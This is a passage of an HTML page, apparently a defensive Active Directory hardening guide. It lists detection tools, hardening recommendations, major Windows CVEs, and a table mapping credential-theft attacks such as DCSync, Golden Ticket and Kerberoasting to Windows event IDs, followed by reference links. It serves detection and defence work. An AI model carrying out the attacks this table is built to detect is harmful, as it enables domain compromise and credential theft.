class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZGV6aHViLzI4NzVmYTZkYzc4MDgzY2VkZWFiMTBhYmM1NTFjYjU4\">Get-ClrReflection</span> - Detects memory-only CLR (.NET) modules.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vamFyZWRjYXRraW5zb24vMjM5MDVkMzQ1MzdjZTRiNWIxODE4YzNlNjQwNWMxZDI=\">Get-InjectedThread</span> - Get-InjectedThread looks at each running thread to determine if it is the result of memory injection.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZpcmVleWUvU2lsa0VUVw==\">SilkETW</span> - SilkETW &amp; SilkService are flexible C# wrappers for ETW, they are meant to abstract away the complexities of ETW and give people a simple interface to perform research and introspection.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzBLZWUtVGVhbS9XYXRjaEFE\">WatchAD</span> - AD Security Intrusion Detection System</li>\n</ul>\n<h3 id=\"sysmon-configuration\"><a class=\"anchor\" href=\"#sysmon-configuration\">#</a> Sysmon Configuration</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29sYWZoYXJ0b25nL3N5c21vbi1tb2R1bGFy\">sysmon-modular</span> - A Sysmon configuration repository for everybody to customise</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01IYWdnaXMvc3lzbW9uLWRmaXI=\">sysmon-dfir</span> - Sources, configuration and how to detect evil things utilizing Microsoft Sysmon.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1N3aWZ0T25TZWN1cml0eS9zeXNtb24tY29uZmln\">sysmon-config</span> - Sysmon configuration file template with default high-quality event tracing</li>\n</ul>\n<h3 id=\"active-directory-security-checks-by-sean-metcalf-pyrotek3\"><a class=\"anchor\" href=\"#active-directory-security-checks-by-sean-metcalf-pyrotek3\">#</a> Active Directory Security Checks (by Sean Metcalf - @Pyrotek3)</h3>\n<h4 id=\"general-recommendations\"><a class=\"anchor\" href=\"#general-recommendations\">#</a> General Recommendations</h4>\n<ul>\n<li>Manage local Administrator passwords (LAPS).</li>\n<li>Implement RDP Restricted Admin mode (as needed).</li>\n<li>Remove unsupported OSs from the network.</li>\n<li>Monitor scheduled tasks on sensitive systems (DCs, etc.).</li>\n<li>Ensure that OOB management passwords (DSRM) are changed regularly &amp; securely stored.</li>\n<li>Use SMB v2/v3+</li>\n<li>Default domain Administrator &amp; KRBTGT password should be changed every year &amp; when an AD admin leaves.</li>\n<li>Remove trusts that are no longer necessary &amp; enable SID filtering as appropriate.</li>\n<li>All domain authentications should be set (when possible) to: &quot;Send NTLMv2 response onlyrefuse LM &amp; NTLM.&quot;</li>\n<li>Block internet access for DCs, servers, &amp; all administration systems.</li>\n</ul>\n<h4 id=\"protect-admin-credentials\"><a class=\"anchor\" href=\"#protect-admin-credentials\">#</a> Protect Admin Credentials</h4>\n<ul>\n<li>No &quot;user&quot; or computer accounts in admin groups.</li>\n<li>Ensure all admin accounts are &quot;sensitive &amp; cannot be delegated&quot;.</li>\n<li>Add admin accounts to &quot;Protected Users&quot; group (requires Windows Server 2012 R2 Domain Controllers, 2012R2 DFL for domain protection).</li>\n<li>Disable all inactive admin accounts and remove from privileged groups.</li>\n</ul>\n<h4 id=\"protect-ad-admin-credentials\"><a class=\"anchor\" href=\"#protect-ad-admin-credentials\">#</a> Protect AD Admin Credentials</h4>\n<ul>\n<li>Limit AD admin membership (DA, EA, Schema Admins, etc.) &amp; only use custom delegation groups.</li>\n<li>‘Tiered’ Administration mitigating credential theft impact.</li>\n<li>Ensure admins only logon to approved admin workstations &amp; servers.</li>\n<li>Leverage time-based, temporary group membership for all admin accounts</li>\n</ul>\n<h4 id=\"protect-service-account-credentials\"><a class=\"anchor\" href=\"#protect-service-account-credentials\">#</a> Protect Service Account Credentials</h4>\n<ul>\n<li>Limit to systems of the same security level.</li>\n<li>Leverage “(Group) Managed Service Accounts” (or PW &gt;20 characters) to mitigate credential theft (kerberoast).</li>\n<li>Implement FGPP (DFL =&gt;2008) to increase PW requirements for SAs and administrators.</li>\n<li>Logon restrictions – prevent interactive logon &amp; limit logon capability to specific computers.</li>\n<li>Disable inactive SAs &amp; remove from privileged groups.</li>\n</ul>\n<h4 id=\"protect-resources\"><a class=\"anchor\" href=\"#protect-resources\">#</a> Protect Resources</h4>\n<ul>\n<li>Segment network to protect admin &amp; critical systems.</li>\n<li>Deploy IDS to monitor the internal corporate network.</li>\n<li>Network device &amp; OOB management on separate network.</li>\n</ul>\n<h4 id=\"protect-domain-controllers\"><a class=\"anchor\" href=\"#protect-domain-controllers\">#</a> Protect Domain Controllers</h4>\n<ul>\n<li>Only run software &amp; services to support AD.</li>\n<li>Minimal groups (&amp; users) with DC admin/logon rights.</li>\n<li>Ensure patches are applied before running DCPromo (especially MS14-068 and other critical patches).</li>\n<li>Validate scheduled tasks &amp; scripts.</li>\n</ul>\n<h4 id=\"protect-workstations-servers\"><a class=\"anchor\" href=\"#protect-workstations-servers\">#</a> Protect Workstations (&amp; Servers)</h4>\n<ul>\n<li>Patch quickly, especially privilege escalation vulnerabilities.</li>\n<li>Deploy security back-port patch (KB2871997).</li>\n<li>Set Wdigest reg key to 0 (KB2871997/Windows 8.1/2012R2+): HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlSecurityProvidersWdigest</li>\n<li>Deploy workstation whitelisting (Microsoft AppLocker) to block code exec in user folders – home dir &amp; profile path.</li>\n<li>Deploy workstation app sandboxing technology (EMET) to mitigate application memory exploits (0-days).</li>\n</ul>\n<h4 id=\"logging\"><a class=\"anchor\" href=\"#logging\">#</a> Logging</h4>\n<ul>\n<li>Enable enhanced auditing</li>\n<li>“Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy category settings”</li>\n<li>Enable PowerShell module logging (“*”) &amp; forward logs to central log server (WEF or other method).</li>\n<li>Enable CMD Process logging &amp; enhancement (KB3004375) and forward logs to central log server.</li>\n<li>SIEM or equivalent to centralize as much log data as possible.</li>\n<li>User Behavioural Analysis system for enhanced knowledge of user activity (such as Microsoft ATA).</li>\n</ul>\n<h4 id=\"security-pros-checks\"><a class=\"anchor\" href=\"#security-pros-checks\">#</a> Security Pro’s Checks</h4>\n<ul>\n<li>Identify who has AD admin rights (domain/forest).</li>\n<li>Identify who can logon to Domain Controllers (&amp; admin rights to virtual environment hosting virtual DCs).</li>\n<li>Scan Active Directory Domains, OUs, AdminSDHolder, &amp; GPOs for inappropriate custom permissions.</li>\n<li>Ensure AD admins (aka Domain Admins) protect their credentials by not logging into untrusted systems (workstations).</li>\n<li>Limit service account rights that are currently DA (or equivalent).</li>\n</ul>\n<h3 id=\"important-security-updates\"><a class=\"anchor\" href=\"#important-security-updates\">#</a> Important Security Updates</h3>\n<table>\n<thead>\n<tr>\n<th>CVE</th>\n<th>Title</th>\n<th>Description</th>\n<th>Link</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CVE-2020-1472</td>\n<td>Netlogon Elevation of Privilege Vulnerability</td>\n<td>An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller, using the Netlogon Remote Protocol (MS-NRPC). An attacker who successfully exploited the vulnerability could run a specially crafted application on a device on the network.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDIwLTE0NzI=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472</span></td>\n</tr>\n<tr>\n<td>CVE-2019-1040</td>\n<td>Windows NTLM Tampering Vulnerability</td>\n<td>A tampering vulnerability exists in Microsoft Windows when a man-in-the-middle attacker is able to successfully bypass the NTLM MIC (Message Integrity Check) protection, aka 'Windows NTLM Tampering Vulnerability'.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE5LTEwNDA=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1040</span></td>\n</tr>\n<tr>\n<td>CVE-2019-0683</td>\n<td>Active Directory Elevation of Privilege Vulnerability</td>\n<td>An elevation of privilege vulnerability exists in Active Directory Forest trusts due to a default setting that lets an attacker in the trusting forest request delegation of a TGT for an identity from the trusted forest, aka 'Active Directory Elevation of Privilege Vulnerability'.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE5LTA2ODM=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0683</span></td>\n</tr>\n<tr>\n<td>CVE-2019-0708</td>\n<td>Remote Desktop Services Remote Code Execution Vulnerability</td>\n<td>A remote code execution vulnerability exists in Remote Desktop Services formerly known as Terminal Services when an unauthenticated attacker connects to the target system using RDP and sends specially crafted requests, aka 'Remote Desktop Services Remote Code Execution Vulnerability'.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE5LTA3MDg=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</span></td>\n</tr>\n<tr>\n<td>CVE-2018-8581</td>\n<td>Microsoft Exchange Server Elevation of Privilege Vulnerability</td>\n<td>An elevation of privilege vulnerability exists in Microsoft Exchange Server, aka &quot;Microsoft Exchange Server Elevation of Privilege Vulnerability.&quot; This affects Microsoft Exchange Server.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE4LTg1MTg=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8518</span></td>\n</tr>\n<tr>\n<td>CVE-2017-0143</td>\n<td>Windows SMB Remote Code Execution Vulnerability</td>\n<td>The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka &quot;Windows SMB Remote Code Execution Vulnerability.&quot; This vulnerability is different from those described in CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE3LTAxNDM=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0143</span></td>\n</tr>\n<tr>\n<td>CVE-2016-0128</td>\n<td>Windows SAM and LSAD Downgrade Vulnerability</td>\n<td>The SAM and LSAD protocol implementations in Microsoft Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8.1, Windows Server 2012 Gold and R2, Windows RT 8.1, and Windows 10 Gold and 1511 do not properly establish an RPC channel, which allows man-in-the-middle attackers to perform protocol-downgrade attacks and impersonate users by modifying the client-server data stream, aka &quot;Windows SAM and LSAD Downgrade Vulnerability&quot; or &quot;BADLOCK.&quot;</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0NWRS0yMDE2LTAxMjg=\">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2016-0128</span></td>\n</tr>\n<tr>\n<td>CVE-2014-6324</td>\n<td>Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780)</td>\n<td>The Kerberos Key Distribution Center (KDC) in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 allows remote authenticated domain users to obtain domain administrator privileges via a forged signature in a ticket, as exploited in the wild in November 2014, aka &quot;Kerberos Checksum Vulnerability.&quot;</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc2VjdXJpdHktdXBkYXRlcy9zZWN1cml0eWJ1bGxldGlucy8yMDE0L21zMTQtMDY4\">https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068</span></td>\n</tr>\n<tr>\n<td>CVE-2014-1812</td>\n<td>Vulnerability in Group Policy Preferences could allow elevation of privilege</td>\n<td>The Group Policy implementation in Microsoft Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 does not properly handle distribution of passwords, which allows remote authenticated users to obtain sensitive credential information and consequently gain privileges by leveraging access to the SYSVOL share, as exploited in the wild in May 2014, aka &quot;Group Policy Preferences Password Elevation of Privilege Vulnerability.&quot;</td>\n<td><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC8yOTYyNDg2L21zMTQtMDI1LXZ1bG5lcmFiaWxpdHktaW4tZ3JvdXAtcG9saWN5LXByZWZlcmVuY2VzLWNvdWxkLWFsbG93LWVsZXZhdGk=\">https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati</span></td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"detection\"><a class=\"anchor\" href=\"#detection\">#</a> Detection</h3>\n<table>\n<thead>\n<tr>\n<th>Attack</th>\n<th>Event ID</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Account and Group Enumeration</td>\n<td>4798: A user's local group membership was enumerated<br>4799: A security-enabled local group membership was enumerated</td>\n</tr>\n<tr>\n<td>AdminSDHolder</td>\n<td>4780: The ACL was set on accounts which are members of administrators groups</td>\n</tr>\n<tr>\n<td>Kekeo</td>\n<td>4624: Account Logon<br>4672: Admin Logon<br>4768: Kerberos TGS Request</td>\n</tr>\n<tr>\n<td>Silver\tTicket</td>\n<td>4624: Account Logon<br>4634: Account Logoff<br>4672: Admin Logon</td>\n</tr>\n<tr>\n<td>Golden\tTicket</td>\n<td>4624: Account Logon<br>4672: Admin Logon</td>\n</tr>\n<tr>\n<td>PowerShell</td>\n<td>4103: Script Block Logging<br>400: Engine Lifecycle<br>403: Engine Lifecycle<br>4103: Module Logging<br>600: Provider Lifecycle<br></td>\n</tr>\n<tr>\n<td>DCShadow</td>\n<td>4742: A computer account was changed<br>5137: A directory service object was created<br>5141: A directory service object was deleted<br>4929: An Active Directory replica source naming context was removed</td>\n</tr>\n<tr>\n<td>Skeleton Keys</td>\n<td>4673: A privileged service was called<br>4611: A trusted logon process has been registered with the Local Security Authority<br>4688: A new process has been created<br>4689: A new process has exited</td>\n</tr>\n<tr>\n<td>PYKEK MS14-068</td>\n<td>4672: Admin Logon<br>4624: Account Logon<br>4768: Kerberos TGS Request</td>\n</tr>\n<tr>\n<td>Kerberoasting</td>\n<td>4769: A Kerberos ticket was requested</td>\n</tr>\n<tr>\n<td>S4U2Proxy</td>\n<td>4769: A Kerberos ticket was requested</td>\n</tr>\n<tr>\n<td>Lateral Movement</td>\n<td>4688: A new process has been created<br>4689: A process has exited<br>4624: An account was successfully logged on<br>4625: An account failed to log on</td>\n</tr>\n<tr>\n<td>DNSAdmin</td>\n<td>770: DNS Server plugin DLL has been loaded<br>541: The setting serverlevelplugindll on scope . has been set to  <code>&lt;dll path&gt;</code> <br>150: DNS Server could not load or initialize the plug-in DLL</td>\n</tr>\n<tr>\n<td>DCSync</td>\n<td>4662: An operation was performed on an object</td>\n</tr>\n<tr>\n<td>Password Spraying</td>\n<td>4625: An account failed to log on<br>4771: Kerberos pre-authentication failed<br>4648: A logon was attempted using explicit credentials</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"resources\"><a class=\"anchor\" href=\"#resources\">#</a> Resources</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC80NTU3MjIyL2hvdy10by1tYW5hZ2UtdGhlLWNoYW5nZXMtaW4tbmV0bG9nb24tc2VjdXJlLWNoYW5uZWwtY29ubmVjdGlvbnMtYXNzb2M=\">How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaHViLnRyaW1hcmNzZWN1cml0eS5jb20vcG9zdC9zZWN1cmluZy1hY3RpdmUtZGlyZWN0b3J5LXBlcmZvcm1pbmctYW4tYWN0aXZlLWRpcmVjdG9yeS1zZWN1cml0eS1yZXZpZXc=\">Securing Active Directory: Performing an Active Directory Security Review</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2VydC5zc2kuZ291di5mci91cGxvYWRzL2d1aWRlLWFkLmh0bWw=\">ACTIVE DIRECTORY SECURITY ASSESSMENT CHECKLIST</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hY3NjLmdvdi5hdS9wdWJsaWNhdGlvbnMvTWl0aWdhdGlvbl9TdHJhdGVnaWVzXzIwMTcucGRm\">ASD Strategies to Mitigate Cyber Security Incidents</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9yZWR1Y2luZy10aGUtYWN0aXZlLWRpcmVjdG9yeS1hdHRhY2stc3VyZmFjZQ==\">Reducing the Active Directory Attack Surface</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoY29tbXVuaXR5Lm1pY3Jvc29mdC5jb20vdDUvUHJlbWllci1GaWVsZC1FbmdpbmVlcmluZy9DaGFuZ2VzLXRvLVRpY2tldC1HcmFudGluZy1UaWNrZXQtVEdULURlbGVnYXRpb24tQWNyb3NzLVRydXN0cy9iYS1wLzQ0MDI4Mw==\">Changes to Ticket-Granting Ticket (TGT) Delegation Across Trusts in Windows Server (AskPFEPlat edition)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLXVzL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0FEVjE5MDAwNg==\">ADV190006 | Guidance to mitigate unconstrained delegation vulnerabilities</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0YWwubXNyYy5taWNyb3NvZnQuY29tL2VuLVVTL3NlY3VyaXR5LWd1aWRhbmNlL2Fkdmlzb3J5L0FEVjE5MDAyMw==\">ADV190023 | Microsoft Guidance for Enabling LDAP Channel Binding and LDAP Signing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL3dpa2kvY29udGVudHMvYXJ0aWNsZXMvMjA5NjQuYWN0aXZlLWRpcmVjdG9yeS11bHRpbWF0ZS1yZWFkaW5nLWNvbGxlY3Rpb24uYXNweA==\">Active Directory: Ultimate Reading Collection</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL3dpa2kvY29udGVudHMvYXJ0aWNsZXMvMTg5MzEuc2VjdXJpdHktaGFyZGVuaW5nLXRpcHMtYW5kLXJlY29tbWVuZGF0aW9ucy5hc3B4\">Security Hardening Tips and Recommendations</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zMzc3\">Securing Domain Controllers to Improve Active Directory Security</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zMjk5\">Securing Windows Workstations: Developing a Secure Baseline</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9pbXBsZW1lbnRpbmctc2VjdXJlLWFkbWluaXN0cmF0aXZlLWhvc3Rz\">Implementing Secure Administrative Hosts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvbWljcm9zb2Z0LWlkZW50aXR5LW1hbmFnZXIvcGFtL3ByaXZpbGVnZWQtaWRlbnRpdHktbWFuYWdlbWVudC1mb3ItYWN0aXZlLWRpcmVjdG9yeS1kb21haW4tc2VydmljZXM=\">Privileged Access Management for Active Directory Domain Services</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1BhdWxTZWMvYXdlc29tZS13aW5kb3dzLWRvbWFpbi1oYXJkZW5pbmc=\">Awesome Windows Domain Hardening</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9iZXN0LXByYWN0aWNlcy1mb3Itc2VjdXJpbmctYWN0aXZlLWRpcmVjdG9yeQ==\">Best Practices for Securing Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ludHJvZHVjaW5nLXRoZS1hZHZlcnNhcnktcmVzaWxpZW5jZS1tZXRob2RvbG9neS1wYXJ0LW9uZS1lMzhlMDZmZmQ2MDQ=\">Introducing the Adversary Resilience Methodology — Part One</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2ludHJvZHVjaW5nLXRoZS1hZHZlcnNhcnktcmVzaWxpZW5jZS1tZXRob2RvbG9neS1wYXJ0LXR3by0yNzlhMWVkNzg2M2Q=\">Introducing the Adversary Resilience Methodology — Part Two</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5taWNyb3NvZnQuY29tL2Rvd25sb2FkLzcvNy9BLzc3QUJDNUJELTgzMjAtNDFBRi04NjNDLTZFQ0ZCMTBDQjRCOS9NaXRpZ2F0aW5nLVBhc3MtdGhlLUhhc2gtQXR0YWNrcy1hbmQtT3RoZXItQ3JlZGVudGlhbC1UaGVmdC1WZXJzaW9uLTIucGRm\">Mitigating Pass-the-Hash and Other Credential Theft, version 2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25zYWN5YmVyL1dpbmRvd3MtU2VjdXJlLUhvc3QtQmFzZWxpbmU=\">Configuration guidance for implementing the Windows 10 and Windows Server 2016 DoD Secure Host Baseline settings</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1zZXJ2ZXIvaWRlbnRpdHkvYWQtZHMvcGxhbi9zZWN1cml0eS1iZXN0LXByYWN0aWNlcy9tb25pdG9yaW5nLWFjdGl2ZS1kaXJlY3RvcnktZm9yLXNpZ25zLW9mLWNvbXByb21pc2U=\">Monitoring Active Directory for Signs of Compromise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuanBjZXJ0Lm9yLmpwL2VuZ2xpc2gvcHViL3NyL0RldGVjdGluZyUyMExhdGVyYWwlMjBNb3ZlbWVudCUyMHRocm91Z2glMjBUcmFja2luZyUyMEV2ZW50JTIwTG9nc192ZXJzaW9uMi5wZGY=\">Detecting Lateral Movement through Tracking Event Logs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZXJ0LmV1cm9wYS5ldS9zdGF0aWMvV2hpdGVQYXBlcnMvVVBEQVRFRCUyMC0lMjBDRVJULUVVX1NlY3VyaXR5X1doaXRlcGFwZXJfMjAxNC0wMDdfS2VyYmVyb3NfR29sZGVuX1RpY2tldF9Qcm90ZWN0aW9uX3YxXzQucGRm\">Kerberos Golden Ticket Protection Mitigating Pass-the-Ticket on Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaWdpdGFsLWZvcmVuc2ljcy5zYW5zLm9yZy9ibG9nLzIwMTMvMDYvMjAvb3ZlcnZpZXctb2YtbWljcm9zb2Z0cy1iZXN0LXByYWN0aWNlcy1mb3Itc2VjdXJpbmctYWN0aXZlLWRpcmVjdG9yeQ==\">Overview of Microsoft's &quot;Best Practices for Securing Active Directory&quot;</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kc2ltZy51Ym0tdXMubmV0L2VudmVsb3BlLzE1NTQyMi8zMTQyMDIvMTMzMDUzNzkxMl9LZXlzX3RvX3RoZV9LaW5nZG9tX0xpbWl0aW5nX0FEX0FkbWlucy5wZGY=\">The Keys to the Kingdom: Limiting Active Directory Administrators</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5zYW5zLm9yZy9jeWJlci1kZWZlbnNlLzIwMTgvMDkvMTAvcHJvdGVjdC1wcml2aWxlZ2VkLWFkLWFjY291bnRzLXdpdGgtZml2ZS1mcmVlLWNvbnRyb2xzLw==\">Protect Privileged AD Accounts With Five Free Controls</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjg0\">The Most Common Active Directory Security Issues and What You Can Do to Fix Them</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL25zYWN5YmVyL0V2ZW50LUZvcndhcmRpbmctR3VpZGFuY2U=\">Event Forwarding Guidance</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubXdyaW5mb3NlY3VyaXR5LmNvbS9vdXItdGhpbmtpbmcvcGxhbnRpbmctdGhlLXJlZC1mb3Jlc3QtaW1wcm92aW5nLWFkLW9uLXRoZS1yb2FkLXRvLWVzYWUv\">Planting the Red Forest: Improving AD on the Road to ESAE</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNDU4\">Detecting Kerberoasting Activity</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vcHQtcHQvcHJldmlvdXMtdmVyc2lvbnMvd2luZG93cy9zZXJ2ZXIvY2M3NTUzMjEodj13cy4xMCk=\">Security Considerations for Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvYWR2YW5jZWQtdGhyZWF0LWFuYWx5dGljcy9zdXNwaWNpb3VzLWFjdGl2aXR5LWd1aWRl\">Advanced Threat Analytics suspicious activity guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZXJ0LmV1cm9wYS5ldS9zdGF0aWMvV2hpdGVQYXBlcnMvQ0VSVC1FVS1TV1BfMTRfMDdfUGFzc1RoZUdvbGRlbl9UaWNrZXRfdjFfMS5wZGY=\">Protection from Kerberos Golden Ticket</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5taWNyb3NvZnQuY29tL2Rvd25sb2FkL0MvMS80L0MxNDU3OUNBLUU1NjQtNDc0My04QjUxLTYxQzA4ODI2NjJBQy9XaW5kb3dzJTIwMTAlMjBjcmVkZW50aWFsJTIwdGhlZnQlMjBtaXRpZ2F0aW9uJTIwZ3VpZGUuZG9jeA==\">Windows 10 Credential Theft Mitigation Guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmphdmVsaW4tbmV0d29ya3MuY29tL2RldGVjdGluZy1wYXNzLXRoZS10aWNrZXQtYW5kLXBhc3MtdGhlLWhhc2gtYXR0YWNrLXVzaW5nLXNpbXBsZS13bWktY29tbWFuZHMtMmM0NjEwMmI3NmJj\">Detecting Pass-The- Ticket and Pass-The- Hash Attack Using Simple WMI Commands</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9TdGVwLWJ5LVN0ZXAtRGVwbG95LUxvY2FsLTdjOWVmNzcy\">Step by Step Deploy Microsoft Local Administrator Password Solution</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJvb3BlcnMuZGUvZG93bmxvYWRzL3Ryb29wZXJzMTcvVFIxN19BRF9zaWduZWQucGRm\">Active Directory Security Best Practices</span></li>\n<li><span class=\"exturl\" 